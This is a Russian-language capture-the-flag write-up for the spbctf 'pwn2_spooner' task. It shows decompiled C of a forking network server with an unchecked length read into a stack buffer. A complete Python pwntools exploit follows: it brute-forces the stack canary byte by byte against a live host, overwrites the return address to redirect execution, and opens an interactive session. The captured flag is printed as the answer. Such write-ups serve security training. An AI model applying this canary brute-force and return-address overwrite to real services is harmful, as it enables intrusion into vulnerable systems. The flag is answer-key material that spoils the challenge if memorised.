[Tasks :: pwn.spbctf.ru](https://pwn.spbctf.ru/tasks/pwn2_spooner)
Описание:
Hi! This is your [binary](https://pwn.spbctf.ru/files/canary/task_spooner)  
nc 109.233.56.90 11591

Необходимо при помощи брутфорса получить канарейку.
``` C
{
  while ( 1 )
  {
    addr_len = 16;
    client = accept(fd, &s, &addr_len);
    if ( client != -1 )
      break;
    perror("accept");
  }
  if ( !fork() )
  {
    current_fd = client;
    alarm(5u);
    handler(client);
    send(client, "Bye!", 5u, 0);
    exit(0);
  }
  close(client);
}

unsigned __int64 __fastcall handler(int client)
{
  int count; // [rsp+10h] [rbp-A0h]
  char nptr[10]; // [rsp+16h] [rbp-9Ah] BYREF
  _BYTE bufer[136]; // [rsp+20h] [rbp-90h] BYREF
  unsigned __int64 canary; // [rsp+A8h] [rbp-8h]

  canary = __readfsqword(0x28u);

  send(client, "Length of data: ", 17u, 0);
  read_n((unsigned int)client, nptr, 10);
  count = atoi(nptr);
  if ( count > 0 )
    read_n((unsigned int)client, bufer, (unsigned int)count);

  return __readfsqword(0x28u) ^ canary;
}
```

Эксплоит:
``` python
def get_canary():
    canary = b'\x00'
    for _ in range(7):
        for b in range(256):
            io = start()
            io.recvuntil(b"data: ")

            payload = b'A' * 136 + canary + bytes([b])
            io.sendline(str(len(payload)).encode())
            io.send(payload)

            try:
                if b'Bye!' in io.recvall(timeout=0.15):
                    canary += bytes([b])
                    print(f"Current: {canary.hex()}")
                    io.close()
                    break
            except EOFError:
                pass

            print('Try:' + canary.hex() + ' ' + bytes([b]).hex())
            io.close()
    return canary

canary = get_canary()

io = start()

io.recvuntil(b"data: ")
payload = b'A' * 136 + canary + b'B' * 8 + p64(0x400B2A)
io.sendline(payload)

io.interactive()
```

Запуск:
![{B0E4A142-1FAC-4D35-87E4-0379FFC2F553}](../../../../z.%20Images/{B0E4A142-1FAC-4D35-87E4-0379FFC2F553}.png)
![{322FEFF4-85EC-4227-87CB-DC6834EE35DF}](../../../../z.%20Images/{322FEFF4-85EC-4227-87CB-DC6834EE35DF}.png)

Ответ: `spbctf{cbe89df84cbbf3c8c9353d12d73953880832dc961039ca87c0a7e0698e826040}`